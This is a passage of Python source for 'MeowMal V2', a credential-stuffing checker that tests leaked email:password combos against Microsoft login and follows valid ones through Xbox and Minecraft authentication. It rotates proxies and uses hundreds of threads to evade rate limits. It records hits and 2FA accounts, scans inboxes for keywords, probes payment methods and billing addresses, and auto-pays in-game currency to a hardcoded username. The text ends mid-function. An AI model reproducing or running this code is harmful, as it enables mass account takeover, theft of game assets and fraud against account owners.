            session = create_optimized_session()
            session.cookies.clear()
            proxy_config = None
            if proxytype != "'4'":
                try:
                    proxy_config, proxy_raw = getproxy(return_raw=True)
                    if proxy_config:
                        session.proxies = proxy_config
                except Exception:
                    pass

            result = _ms_login(email, password, session, proxy_config)


            if result == 'ERROR':
                if proxy_raw:
                    mark_proxy_failed(proxy_raw)
                current_try += 1
                try: session.close()
                except: pass
                continue

            if result == '2FA':
                with stats_lock:
                    twofa += 1
                try:
                    write_dedupe(fname, '2fa.txt', f'{email}:{password}\n')
                except Exception:
                    pass
                if UI_ENABLED and ui:
                    ui.log_2fa(email)
                try: session.close()
                except: pass
                return '2FA'

            if result == 'None' or result is None:
                try: session.close()
                except: pass
                return False


            if isinstance(result, tuple):
                login_session, access_token = result
                if login_session is not None:
                    session = login_session
            else:
                access_token = result  # legacy fallback


            xbox_token_for_auth = None
            try:
                xbox_auth_url = (
                    'https://login.live.com/oauth20_authorize.srf'
                    '?client_id=00000000402B5328&response_type=token'
                    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
                    '&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                )
                r_silent = session.get(xbox_auth_url, timeout=10, allow_redirects=True)
                import urllib.parse as _up
                for resp in [r_silent] + list(getattr(r_silent, 'history', [])):
                    if hasattr(resp, 'url') and resp.url:
                        frag = _up.parse_qs(_up.urlparse(resp.url).fragment)
                        if 'access_token' in frag and frag['access_token'][0]:
                            xbox_token_for_auth = frag['access_token'][0]
                            break
                        qs = _up.parse_qs(_up.urlparse(resp.url).query)
                        if 'access_token' in qs and qs['access_token'][0]:
                            xbox_token_for_auth = qs['access_token'][0]
                            break
                    loc = resp.headers.get('Location', '') if hasattr(resp, 'headers') else ''
                    if 'access_token=' in loc:
                        xbox_token_for_auth = _up.unquote(loc.split('access_token=')[1].split('&')[0])
                        break
            except Exception:
                pass


            if not xbox_token_for_auth and access_token:
                xbox_token_for_auth = access_token

            if not xbox_token_for_auth:

                if config.get('payment') is True:
                    try: payment(session, email, password)
                    except: pass
                validmail(email, password)

                try:
                    threading.Thread(target=enrich_valid_account, args=(session, email, password, None, fname), daemon=True).start()
                except Exception:
                    pass
                return 'VALID_MAIL'


            hit = False
            xbl_token = None
            _using_proxy = (proxytype != "'4'")
            for _xbox_attempt in range(2):  # retry once on connection error
                try:

                    xbox_login = session.post(
                        'https://user.auth.xboxlive.com/user/authenticate',
                        json={'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com',
                                             'RpsTicket': xbox_token_for_auth},
                              'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT'},
                        headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                        timeout=int(config.get('timeout', 10))
                    )

                    if xbox_login.status_code != 200:

                        rps2 = 'd=' + xbox_token_for_auth if not xbox_token_for_auth.startswith('d=') else xbox_token_for_auth
                        xbox_login = session.post(
                            'https://user.auth.xboxlive.com/user/authenticate',
                            json={'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com',
                                                 'RpsTicket': rps2},
                                  'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT'},
                            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                            timeout=int(config.get('timeout', 10))
                        )

                    if xbox_login.status_code == 200:
                        js = xbox_login.json()
                        xbl_token = js.get('Token')
                        if xbl_token:
                            uhs = js['DisplayClaims']['xui'][0]['uhs']
                            xsts = session.post(
                                'https://xsts.auth.xboxlive.com/xsts/authorize',
                                json={'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbl_token]},
                                      'RelyingParty': 'rp://api.minecraftservices.com/', 'TokenType': 'JWT'},
                                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                                timeout=int(config.get('timeout', 10))
                            )
                            if xsts.status_code == 200:
                                xsts_token = xsts.json().get('Token')
                                if xsts_token:
                                    mc_access = mc_token(session, uhs, xsts_token)
                                    if mc_access:
                                        hit = checkmc(session, email, password, mc_access, xbl_token)
                    break  # success or non-connection error , don't retry

                except Exception:

                    if _xbox_attempt == 0 and _using_proxy:
                        try:
                            session.proxies = getproxy()
                        except Exception:
                            pass
                    else:
                        break

            if config.get('payment') is True:
                try: payment(session, email, password)
                except: pass

            validmail(email, password)


            try:
                threading.Thread(target=enrich_valid_account, args=(session, email, password, xbl_token, fname), daemon=True).start()
            except Exception:
                pass

            if hit:
                return True
            return 'VALID_MAIL'

        except Exception:
            if proxy_raw:
                mark_proxy_failed(proxy_raw)
            current_try += 1
            with stats_lock:
                retries += 1
            if current_try > maxretries:
                return 'ERROR'
    return 'ERROR'

def fetch_proxies_from_api(proxy_type='http'):
    global proxylist, last_proxy_fetch, proxy_api_url, proxy_request_num, proxy_time, api_socks4, api_socks5, api_http
    try:
        current_time = time.time()
        if last_proxy_fetch > 0 and current_time - last_proxy_fetch < proxy_time * 60:
            return True
        api_sources = []
        if proxy_api_url:
            api_sources = [proxy_api_url]
            print(f'{Fore.CYAN}[INFO] Using custom proxy API{Fore.RESET}')
        elif proxy_type == 'socks4':
            api_sources = api_socks4
            print(f'{Fore.CYAN}[INFO] Using free SOCKS4 proxy sources{Fore.RESET}')
        elif proxy_type == 'socks5':
            api_sources = api_socks5
            print(f'{Fore.CYAN}[INFO] Using free SOCKS5 proxy sources{Fore.RESET}')
        elif proxy_type == 'http':
            api_sources = api_http
            print(f'{Fore.CYAN}[INFO] Using free HTTP/HTTPS proxy sources{Fore.RESET}')
        else:
            print(f'{Fore.YELLOW}[WARNING] Unknown proxy type: {proxy_type}{Fore.RESET}')
            return False
        if not api_sources:
            return False
        print(f'\n{Fore.CYAN}[INFO] Fetching proxies from {len(api_sources)} API source(s)...{Fore.RESET}')
        all_proxies = []
        success_count = 0
        for idx, api_url in enumerate(api_sources, 1):
            try:
                print(f'{Fore.CYAN}[{idx}/{len(api_sources)}] Fetching from: {api_url[:60]}...{Fore.RESET}')
                response = requests.get(api_url, timeout=15)
                if response.status_code == 200:
                    new_proxies = [line.strip() for line in response.text.split('\n') if line.strip()]
                    if new_proxies:
                        all_proxies.extend(new_proxies)
                        success_count += 1
                        print(f'{Fore.GREEN}[✓] Fetched {len(new_proxies)} proxies{Fore.RESET}')
                    else:
                        print(f'{Fore.YELLOW}[⚠] No proxies returned{Fore.RESET}')
                else:
                    print(f'{Fore.RED}[✗] Status code: {response.status_code}{Fore.RESET}')
            except Exception as e:
                print(f'{Fore.RED}[✗] Failed: {str(e)[:50]}{Fore.RESET}')
                continue
        if all_proxies:
            all_proxies = list(set(all_proxies))
            if proxy_request_num > 0:
                all_proxies = all_proxies[:proxy_request_num]
            proxylist = all_proxies
            last_proxy_fetch = current_time
            print(f'{Fore.GREEN}[SUCCESS] Total: {len(proxylist)} unique proxies loaded from {success_count}/{len(api_sources)} sources{Fore.RESET}')
            print(f'{Fore.CYAN}[INFO] Next refresh in {proxy_time} minutes{Fore.RESET}')
            if UI_ENABLED and ui:
                ui.log_info(f'Fetched {len(proxylist)} {proxy_type} proxies from {success_count} API sources')
            return True
        else:
            print(f'{Fore.RED}[ERROR] No proxies fetched from any source{Fore.RESET}')
            return False
    except Exception as e:
        print(f'{Fore.RED}[ERROR] Failed to fetch proxies from API: {str(e)}{Fore.RESET}')
        return False

failed_proxies = set()
proxy_failure_count = {}
PROXY_FAILURE_THRESHOLD = 2
proxy_blacklist_lock = threading.Lock()

def mark_proxy_failed(proxy_str):
    global failed_proxies, proxy_failure_count
    if not proxy_str:
        return
    with proxy_blacklist_lock:
        if proxy_str not in proxy_failure_count:
            proxy_failure_count[proxy_str] = 0
        proxy_failure_count[proxy_str] += 1
        
        if proxy_failure_count[proxy_str] >= PROXY_FAILURE_THRESHOLD:
            failed_proxies.add(proxy_str)


def getproxy(return_raw=False):
    global auto_proxy, last_proxy_fetch, proxy_time, proxylist, proxytype
    proxy_protocol = 'http'
    if proxytype == "'2'":
        proxy_protocol = 'socks4'
    elif proxytype == "'3'":
        proxy_protocol = 'socks5'
    elif proxytype == "'4'":
        return ({}, None) if return_raw else {}
    if auto_proxy and len(proxylist) == 0:
        fetch_proxies_from_api(proxy_protocol)
    elif auto_proxy and last_proxy_fetch > 0 and (time.time() - last_proxy_fetch >= proxy_time * 60):
        fetch_proxies_from_api(proxy_protocol)
    if len(proxylist) > 0:
        with proxy_blacklist_lock:
            available_proxies = [p for p in proxylist if p not in failed_proxies]
            
            if len(available_proxies) == 0 and len(proxylist) > 0:
                failed_proxies.clear()
                proxy_failure_count.clear()
                available_proxies = proxylist
            
            if len(available_proxies) > 0:
                proxy = random.choice(available_proxies)
            else:
                return ({}, None) if return_raw else {}

        if proxytype == "'2'":
            protocol_prefix = 'socks4'
        elif proxytype == "'3'":
            protocol_prefix = 'socks5'
        else:
            protocol_prefix = 'http'
        try:
            if '@' in proxy:
                proxy_url = f'{protocol_prefix}://{proxy}'
                res = {'http': proxy_url, 'https': proxy_url}
                return (res, proxy) if return_raw else res
            parts = proxy.split(':')
            if len(parts) == 2:
                ip, port = parts
                proxy_url = f'{protocol_prefix}://{ip}:{port}'
                res = {'http': proxy_url, 'https': proxy_url}
                return (res, proxy) if return_raw else res
            elif len(parts) == 4:
                ip, port, username, password = parts
                proxy_url = f'{protocol_prefix}://{username}:{password}@{ip}:{port}'
                res = {'http': proxy_url, 'https': proxy_url}
                return (res, proxy) if return_raw else res
            elif len(parts) == 3 and ';' in parts[2]:
                ip, port, auth = parts
                user, password = auth.split(';', 1)
                proxy_url = f'{protocol_prefix}://{user}:{password}@{ip}:{port}'
                res = {'http': proxy_url, 'https': proxy_url}
                return (res, proxy) if return_raw else res
            else:
                proxy_url = f'{protocol_prefix}://{proxy}'
                res = {'http': proxy_url, 'https': proxy_url}
                return (res, proxy) if return_raw else res
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f'Proxy format error: {str(e)}')
            return ({}, None) if return_raw else {}
    return ({}, None) if return_raw else {}

def normalize_combo(line):
    if not line:
        return None
    line = line.strip()
    if not line or ':' not in line:
        return None
    parts = line.split(':', 1)
    email = parts[0].strip()
    password = parts[1].strip() if len(parts) > 1 else ''
    if email and password and '@' in email:
        return f"{email}:{password}"
    return None

def Checker(combo, session=None):
    global bad, checked, cpm, hits, errors, retries
    try:
        norm = normalize_combo(combo)
        if not norm:
            with stats_lock:
                bad += 1
                checked += 1
            if UI_ENABLED and ui:
                ui.log_bad(combo.split(':')[0] if combo and ':' in combo else combo)
            return
        split = norm.split(':', 1)
        email = split[0].strip()
        password = split[1].strip()
        result = False
        _max_check_retries = min(maxretries, 3)
        for _attempt in range(_max_check_retries):
            try:
                result = authenticate(str(email), str(password), session=session)
                if result == 'ERROR' and _attempt < _max_check_retries - 1:
                    with stats_lock:
                        retries += 1
                    continue
                break
            except Exception:
                result = 'ERROR'
                if _attempt < _max_check_retries - 1:
                    with stats_lock:
                        retries += 1
                    continue
                break
        with stats_lock:
            checked += 1
        if result is True or result == 'HIT' or result == 'VALID_MAIL' or result == '2FA':
            pass
        elif result == 'ERROR':
            with stats_lock:
                errors += 1
        else:
            with stats_lock:
                bad += 1
            if UI_ENABLED and ui:
                ui.log_bad(email)
            if config.get('save_bad', False):
                try:
                    write_dedupe(fname, 'Bad.txt', f'{email}:{password}\n')
                except Exception:
                    pass
    except Exception as e:
        with stats_lock:
            bad += 1
            checked += 1
            errors += 1
        if UI_ENABLED and ui:
            ui.log_error(f'Error: {str(e)[:50]}')

checker_start_time = None

def logscreen():
    global cpm, cpm1, screen, hits, bad, twofa, mfa, sfa, xgp, xgpu, vm, other, checked, retries, errors, checker_start_time, autopay_count
    total_combos = len(Combos)
    if not checker_start_time:
        checker_start_time = time.time()
    while checked < total_combos:
        elapsed = time.time() - checker_start_time
        cpm_val = int(checked / elapsed * 60) if elapsed > 0 else 0
        cpm1 = cpm_val
        try:
            title_stats = f"MeowMal V2 | Checked: {checked}/{total_combos} | Valid Mail: {vm} | Bad: {bad} | 2FA: {twofa} | Minecraft: {hits} | DonutSMP AutoPay: {autopay_count} | CPM: {cpm_val} | Retries: {retries}"
            utils.set_title(title_stats)
        except Exception:
            pass
        if UI_ENABLED and ui:
            ui.update_stats(hits=hits, bad=bad, twofa=twofa, valid_mail=vm, autopay=autopay_count, xgp=xgp, xgpu=xgpu, other=other, mfa=mfa, sfa=sfa, minecraft_capes=minecraft_capes, optifine_capes=optifine_capes, inbox_matches=inbox_matches, name_changes=name_changes, payment_methods=payment_methods, checked=checked, total=total_combos, cpm=cpm_val, retries=retries, errors=errors)
        time.sleep(1)


def load_proxy_file():
    global proxylist
    filename = None
    default_file = 'proxies.txt'
    if os.path.exists(default_file):
        print(f"✓ Found '{default_file}' in current directory!")
        try:
            use_default = input('Use this file? (Y/n): ').strip().lower()
        except EOFError:
            use_default = 'y'
        if use_default != 'n':
            filename = default_file
    if filename is None:
        print('⚠ No proxy file found or selected.')
        try:
            filename = input('Load Proxy: ').strip()
        except EOFError:
            pass
        filename = filename.strip('"').strip("'")
    if not filename or not os.path.exists(filename):
        print(f"✗ Invalid file path or file doesn't exist.")
        print('Continuing without proxies...')
        return
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            proxylist = [line.strip() for line in f if line.strip()]
        print(f'✓ [{len(proxylist)}] Proxies Loaded.')
        if UI_ENABLED and ui:
            ui.log_info(f'{len(proxylist)} proxies loaded')
    except Exception as e:
        print(f'✗ Error reading proxy file: {str(e)}')
        time.sleep(0.5)
def Load():
    global Combos, fname
    filename = 'acc.txt'
    if not os.path.exists(filename):
        print(f"\n{Fore.RED}✗ 'acc.txt' not found in current directory.{Fore.RESET}")
        print(f"{Fore.YELLOW}Please create 'acc.txt' with your combos.{Fore.RESET}")
        time.sleep(3)
        return
    fname = os.path.splitext(os.path.basename(filename))[0]
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as e:
            lines = e.readlines()
            seen = set()
            unique_lines = []
            for line in lines:
                norm = normalize_combo(line)
                if norm:
                    norm_lower = norm.lower()
                    if norm_lower not in seen:
                        seen.add(norm_lower)
                        unique_lines.append(norm)
            Combos = unique_lines
            dupes_removed = len(lines) - len(Combos)
            num_threads = int(config.get('threads', 300))
            lines_per_worker = max(1, len(Combos) // max(1, num_threads))
            print(f"\n{Fore.BLUE}{'=' * 60}")
            print(f'{Fore.CYAN}📄 File Statistics:')
            print(f'{Fore.BLUE}  • Total Lines Read: {len(lines)}')
            print(f'{Fore.BLUE}  • Duplicates Removed: {dupes_removed}')
            print(f'{Fore.BLUE}  • Valid Combos Loaded: {len(Combos)}')
            print(f'{Fore.BLUE}  • Lines / Worker: ~{lines_per_worker}')
            print(f"{Fore.BLUE}{'=' * 60}")
            if UI_ENABLED and ui:
                ui.log_info(f'Loaded {len(Combos)} combos ({dupes_removed} duplicates removed, ~{lines_per_worker} lines/worker)')
            print(f'\n{Fore.CYAN}✓ File loaded successfully!{Fore.RESET}')
            time.sleep(1)
    except (IOError, OSError, MemoryError) as e:
        print(f'\n✗ Error reading combo file: {str(e)}')
        print('Please check the file and try again.')
        time.sleep(2)
        return
    except Exception as e:
        print(f'\n✗ Error reading file: {str(e)}')
        print(f'✗ Your file is probably corrupted or in wrong format.')
        time.sleep(2)
        return
def loadconfig():
    global maxretries, config
    def str_to_bool(value):
        if isinstance(value, bool):
            return value
        return str(value).lower() in ('yes', 'true', 't', '1', 'on')
    config_loader = ConfigLoader('config.ini')
    config_loader.parse_all_sections()
    for key, value in config_loader.settings.items():
        config.set(key, value)
    maxretries = int(config_loader.settings.get('max_retries', 2))
    config.set('threads', int(config_loader.settings.get('threads', 300)))
    config.set('max_retries', maxretries)
    config.set('timeout', int(config_loader.settings.get('timeout', 6)))
    config.set('use_proxies', str_to_bool(config_loader.settings.get('use_proxies', True)))
    config.set('scan_inbox', str_to_bool(config_loader.settings.get('scan_inbox', True)))
    config.set('inbox_keywords', config_loader.settings.get('inbox_keywords', 'steam, netflix, Crunchyroll, discord, microsoft, nordvpn'))
    config.set('donut_stats', str_to_bool(config_loader.settings.get('donut_stats', True)))
    config.set('donut_api_key', config_loader.settings.get('donut_api_key', ''))
    config.set('donutsmp_autopay', str_to_bool(config_loader.settings.get('donutsmp_autopay', True)))
    config.set('donutsmp_pay_username', config_loader.settings.get('donutsmp_pay_username', 'RivanSoul'))
    config.set('donutsmp_server', config_loader.settings.get('donutsmp_server', 'donutsmp.net'))
    config.set('enable_notifications', str_to_bool(config_loader.settings.get('enable_notifications', False)))
    config.set('discord_webhook_url', config_loader.settings.get('discord_webhook_url', ''))
    config.set('webhook_username', config_loader.settings.get('webhook_username', 'MeowMal Checker'))
    config.set('webhook_avatar_url', config_loader.settings.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png'))
    config.set('notify_on_hit', str_to_bool(config_loader.settings.get('notify_on_hit', True)))
    config.set('notify_on_game_pass', str_to_bool(config_loader.settings.get('notify_on_game_pass', True)))
    config.set('notify_on_mfa', str_to_bool(config_loader.settings.get('notify_on_mfa', True)))
    config.set('embed_thumbnail', str_to_bool(config_loader.settings.get('embed_thumbnail', True)))
    config.set('embed_footer', str_to_bool(config_loader.settings.get('embed_footer', True)))
    config.set('embed_thumbnail_url', config_loader.settings.get('embed_thumbnail_url', 'https://i.imgur.com/4M34hi2.png'))
    config.set('embed_image_enabled', str_to_bool(config_loader.settings.get('embed_image_enabled', True)))
    config.set('embed_image_template', config_loader.settings.get('embed_image_template', 'https://hypixel.paniek.de/signature/{uuid}/general-tooltip'))
    embed_color_hit = validate_hex_color(config_loader.settings.get('embed_color_hit', '#57F287'))
    embed_color_xgp = validate_hex_color(config_loader.settings.get('embed_color_xgp', '#3498DB'))
    config.set('embed_color_hit', embed_color_hit if embed_color_hit is not None else 5763719)
    config.set('embed_color_xgp', embed_color_xgp if embed_color_xgp is not None else 3447003)
    config.set('check_microsoft_balance', str_to_bool(config_loader.settings.get('check_microsoft_balance', False)))
    config.set('check_rewards_points', str_to_bool(config_loader.settings.get('check_rewards_points', True)))
    config.set('check_payment_methods', str_to_bool(config_loader.settings.get('check_payment_methods', True)))
    config.set('check_subscriptions', str_to_bool(config_loader.settings.get('check_subscriptions', True)))
    config.set('check_orders', str_to_bool(config_loader.settings.get('check_orders', True)))
    config.set('check_billing_address', str_to_bool(config_loader.settings.get('check_billing_address', True)))
    proxy_config = config_loader.get_proxy_config()
    config.set('auto_proxy', str_to_bool(proxy_config.get('auto_proxy', False)))
    config.set('proxy_api', proxy_config.get('proxy_api', ''))
    config.set('request_num', int(proxy_config.get('request_num', 3)))
    config.set('proxy_time', int(proxy_config.get('proxy_time', 5)))
    config.set('show_live_logs', str_to_bool(config_loader.settings.get('show_live_logs', True)))
    config.set('cui_theme', config_loader.settings.get('theme', 'blue'))
    try:
        config.set('warn_on_slow_check', str_to_bool(config_loader.settings.get('warn_on_slow_check', False)))
    except Exception:
        config.set('warn_on_slow_check', False)
    try:
        config.set('slow_check_warn_seconds', int(config_loader.settings.get('slow_check_warn_seconds', 75)))
    except Exception:
        config.set('slow_check_warn_seconds', 75)
    config.set('optimize_network', str_to_bool(config_loader.settings.get('optimize_network', True)))
    config.set('connection_pool_size', int(config_loader.settings.get('connection_pool_size', 1000)))
    config.set('dns_cache_enabled', str_to_bool(config_loader.settings.get('dns_cache_enabled', True)))
    config.set('keep_alive_enabled', str_to_bool(config_loader.settings.get('keep_alive_enabled', True)))
    return True
def Main():
    global fname, screen, config, proxytype, banproxies, errors, cpm1, hits, bad, twofa, vm, xgp, xgpu, other, mfa, sfa, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, checked, retries
    utils.set_title("MeowMal by MeowMal Dev's")
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        if loadconfig():
            print(f'{Fore.GREEN}✓ Configuration loaded successfully{Fore.RESET}')
            if config.get('enable_notifications'):
                webhook_url = config.get('discord_webhook_url', '')
                if webhook_url and webhook_url.strip():
                    print(f'{Fore.GREEN}✓ Discord webhook configured{Fore.RESET}')
                else:
                    print(f'{Fore.YELLOW}⚠ Webhook enabled but no URL set{Fore.RESET}')
        else:
            print(f'{Fore.YELLOW}⚠ Using default configuration{Fore.RESET}')
        ui.config = config
    except Exception as e:
        print(f'{Fore.RED}Error loading configuration: {str(e)}{Fore.RESET}')
        print(f'{Fore.YELLOW}Using default settings{Fore.RESET}')
        traceback.print_exc()
        if config.get('proxylessban') is False and config.get('hypixelban') is True:
            if config.get('differentproxy'):
                print(f'\n{Fore.LIGHTBLUE_EX}Select your SOCKS5 Ban Checking Proxies.{Fore.RESET}')
                banproxyload()
            else:
                banproxies.extend(proxylist)
    thread = int(config.get('threads', 50))
    print(f'{Fore.CYAN}✓ Thread count set to: {thread}{Fore.RESET}')
    optimize_network = config.get('optimize_network', True)
    if optimize_network:
        timeout = get_optimized_timeout(config)
        print(f'{Fore.GREEN}✓ Network optimization: ENABLED (timeout: {timeout}){Fore.RESET}\n')
    else:
        print(f'{Fore.YELLOW}⚠ Network optimization: DISABLED{Fore.RESET}\n')

    Proxys()
    thread = int(config.get('threads', 300))
    if proxytype == "'4'" and thread > 150:
        print(f'{Fore.YELLOW}⚠ Proxyless mode: capping threads {thread} → 150 to avoid rate-limiting.{Fore.RESET}')
        thread = 150
    print(f'{Fore.CYAN}✓ Active Worker Threads: {thread}{Fore.RESET}')
    print(f"{Fore.BLUE}{'=' * 60}")
    print(f'{Fore.CYAN}📁 LOAD COMBO FILE')
    print(f"{Fore.BLUE}{'=' * 60}{Fore.RESET}")
    Load()
    if not Combos:
        print(f'{Fore.BLUE}No combos loaded. Exiting...{Fore.RESET}')
        time.sleep(2)
        return
    if not os.path.exists('results'):
        os.makedirs('results/')
    timestamp = datetime.now().strftime('%Y-%m-%d_%H%M%S')
    fname = timestamp
    if not os.path.exists(f'results/{fname}'):
        os.makedirs(f'results/{fname}', exist_ok=True)

    print(f'\n{Fore.GREEN}Starting high-performance checker...{Fore.RESET}')
    print(f'{Fore.CYAN}Results will be saved to: results/{fname}{Fore.RESET}\n')
    try:

        global checker_start_time
        checker_start_time = time.time()
        threading.Thread(target=logscreen, daemon=True).start()
        print(f'{Fore.GREEN}Processing {len(Combos)} accounts across {thread} device workers...{Fore.RESET}\n')
        if UI_ENABLED and ui:
            ui.start_checking(len(Combos))
        import queue
        combo_queue = queue.Queue()
        for combo in Combos:
            combo_queue.put(combo)

        def _worker():
            worker_session = create_optimized_session()
            while True:
                try:
                    c = combo_queue.get_nowait()
                except queue.Empty:
                    break
                try:
                    Checker(c, session=worker_session)
                except Exception as e:
                    with stats_lock:
                        global errors, checked
                        errors += 1
                        checked += 1
                    if UI_ENABLED and ui:
                        ui.log_error(f'Worker error: {str(e)[:50]}')
                finally:
                    combo_queue.task_done()

        workers = []
        for _ in range(thread):
            w = threading.Thread(target=_worker)
            w.daemon = True
            w.start()
            workers.append(w)
            
        for w in workers:
            w.join()
        print(f"\n{Fore.CYAN}{'=' * 60}")
        print(f'{Fore.YELLOW}⏳ Collecting Final Live Stats...')
        print(f"{Fore.CYAN}{'=' * 60}{Fore.RESET}\n")
        if UI_ENABLED and ui:
            ui.log_info(f'⏳ Collecting Final Live Stats...')
        for countdown in range(30, 0, -1):
            print(f'{Fore.YELLOW}⏳ Collecting Live Stats... {countdown}s remaining{Fore.RESET}', end='\r')
            try:
                utils.set_title(f'⏳ Collecting Live Stats... {countdown}s | Hits: {hits} - Bad: {bad} - 2FA: {twofa}')
            except:
                pass
            if UI_ENABLED and ui:
                ui.update_stats(hits=hits, bad=bad, twofa=twofa, valid_mail=vm, xgp=xgp, xgpu=xgpu, other=other, mfa=mfa, sfa=sfa, minecraft_capes=minecraft_capes, optifine_capes=optifine_capes, inbox_matches=inbox_matches, name_changes=name_changes, payment_methods=payment_methods, checked=checked, total=len(Combos), cpm=cpm1, retries=retries, errors=errors)
                ui.show_ui_screen()
            time.sleep(1)
        try:
            hits_file = f'results/{fname}/Hits.txt'
            if os.path.exists(hits_file):
                with open(hits_file, 'r', encoding='utf-8', errors='ignore') as hf:
                    file_hits = sum((1 for line in hf if line.strip()))
                with stats_lock:
                    if file_hits > hits:
                        hits = file_hits
        except Exception:
            pass
        print(f"\r{' ' * 80}\r", end='')
        print(f'{Fore.GREEN}✅ Live Stats Collected!{Fore.RESET}\n')
        print(f"{Fore.CYAN}{'=' * 60}")
        print(f'{Fore.YELLOW}Final Results:')
        print(f'{Fore.GREEN}   Hits: {hits} {Fore.WHITE}| {Fore.RED}Bad: {bad} {Fore.WHITE}| {Fore.MAGENTA}2FA: {twofa} {Fore.WHITE}| {Fore.GREEN}MFA: {mfa} {Fore.WHITE}| {Fore.YELLOW}SFA: {sfa}')
        print(f'{Fore.LIGHTCYAN_EX}   XGP: {xgp} {Fore.WHITE}| {Fore.CYAN}XGPU: {xgpu} {Fore.WHITE}| {Fore.LIGHTYELLOW_EX}Other: {other} {Fore.WHITE}| {Fore.CYAN}Valid Mail: {vm}')
        print(f"{Fore.CYAN}{'=' * 60}{Fore.RESET}\n")
        if UI_ENABLED and ui:
            ui.log_info(f'✅ Live Stats Collected! Final Results:')
            ui.log_info(f'   Hits: {hits} | Bad: {bad} | 2FA: {twofa} | MFA: {mfa} | SFA: {sfa}')
            ui.log_info(f'   XGP: {xgp} | XGPU: {xgpu} | Other: {other} | Valid Mail: {vm}')
        if UI_ENABLED and ui:
            ui.show_finished_screen(f'results/{fname}')
        else:
            print(f"\n{Fore.GREEN}{'=' * 60}")
            print(f'{Fore.YELLOW}Checking Completed!')
            print(f"{Fore.GREEN}{'=' * 60}")
            print(f'{Fore.WHITE}Total Checked: {checked}')
            print(f'{Fore.GREEN}Hits: {hits}')
            print(f'{Fore.RED}Bad: {bad}')
            print(f'{Fore.MAGENTA}2FA: {twofa}')
            print(f'{Fore.CYAN}Valid Mail: {vm}')
            print(f'{Fore.LIGHTCYAN_EX}Xbox Game Pass Ultimate: {xgpu}')
            print(f'{Fore.LIGHTBLUE_EX}Xbox Game Pass: {xgp}')
            print(f'{Fore.GREEN}MFA: {mfa}')
            print(f'{Fore.YELLOW}SFA: {sfa}')
            print(f'{Fore.LIGHTYELLOW_EX}Other: {other}')
            print(f'{Fore.CYAN}Results saved to: results/{fname}')
            print(f"{Fore.GREEN}{'=' * 60}{Fore.RESET}\n")
        try:
            input('Press Enter to exit...')
        except EOFError:
            pass
    except KeyboardInterrupt:
        print(f'\n\n{Fore.YELLOW}Checker interrupted by user.{Fore.RESET}')
        if UI_ENABLED and ui:
            ui.show_finished_screen(f'results/{fname}' if fname else 'results/interrupted')
    except Exception as e:
        print(f'\n{Fore.RED}Error: {str(e)}{Fore.RESET}')
        if UI_ENABLED and ui:
            ui.show_error_screen(str(e))
        traceback.print_exc()
        try:
            input('Press Enter to exit...')
        except EOFError:
            pass
    finally:
        try:
            _flush_write_buffer()  
        except Exception:
            pass
        print(f'\n{Fore.CYAN}Thank you for using MeowMal! 🐱{Fore.RESET}\n')
def detect_proxy_protocol(proxies_list):
    if not proxies_list:
        return '4'
    print(f'{Fore.BLUE}🔍 Detecting proxy type and testing connectivity...{Fore.RESET}')
    protocols = [('http', '1'), ('socks5', '3'), ('socks4', '2')]
    max_checks = min(3, len(proxies_list))
    alive_count = 0
    detected_proto = None
    for i in range(max_checks):
        test_proxy = proxies_list[i]
        for scheme, type_code in protocols:
            try:
                if '@' in test_proxy:
                    proxy_url = f'{scheme}://{test_proxy}'
                else:
                    parts = test_proxy.split(':')
                    if len(parts) == 4:
                        ip, port, user, pwd = parts
                        proxy_url = f'{scheme}://{user}:{pwd}@{ip}:{port}'
                    elif len(parts) == 2:
                        ip, port = parts
                        proxy_url = f'{scheme}://{ip}:{port}'
                    else:
                        proxy_url = f'{scheme}://{test_proxy}'
                proxies = {'http': proxy_url, 'https': proxy_url}
                response = requests.get('https://login.live.com', proxies=proxies, timeout=2)
                if response.status_code in (200, 302, 400, 401, 404):
                    alive_count += 1
                    if detected_proto is None:
                        detected_proto = type_code
                        print(f'{Fore.CYAN}✓ Detected {scheme.upper()} proxy (sample {i+1} connected){Fore.RESET}')
                    break
            except Exception:
                continue
    if detected_proto:
        return detected_proto
    print(f'{Fore.YELLOW}⚠ Warning: Sample proxies could not connect to Microsoft.{Fore.RESET}')
    print(f'{Fore.BLUE}ℹ Defaulting to HTTP proxy type.{Fore.RESET}')
    return '1'
def Proxys():
    global proxylist, proxytype, auto_proxy, proxy_api_url, proxy_request_num, proxy_time
    print(f"\n{Fore.BLUE}{'=' * 60}")
    print(f'{Fore.CYAN}AUTO LOAD PROXY FILE')
    print(f"{Fore.BLUE}{'=' * 60}{Fore.RESET}")
    if not config.get('use_proxies', True):
        print(f"{Fore.CYAN}ℹ Proxyless mode enabled in config.ini.{Fore.RESET}")
        proxytype = "'4'"
        return
    filename = 'proxies.txt'
    if not os.path.exists(filename):
        print(f"{Fore.BLUE}⚠ 'proxies.txt' not found.{Fore.RESET}")
        print(f'{Fore.BLUE}Continuing without proxies (Proxyless Mode).{Fore.RESET}')
        proxytype = "'4'"
        return
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            proxylist = [line.strip() for line in f if line.strip()]
        if not proxylist:
            print(f"{Fore.BLUE}⚠ 'proxies.txt' is empty.{Fore.RESET}")
            print(f'{Fore.BLUE}Continuing without proxies (Proxyless Mode).{Fore.RESET}')
            proxytype = "'4'"
            return
        print(f'{Fore.CYAN}[{len(proxylist)}] Proxies Loaded.{Fore.RESET}')
        if UI_ENABLED and ui:
            ui.log_info(f'{len(proxylist)} proxies loaded')
        detected_type = detect_proxy_protocol(proxylist)
        proxytype = f"'{detected_type}'"
    except Exception as e:
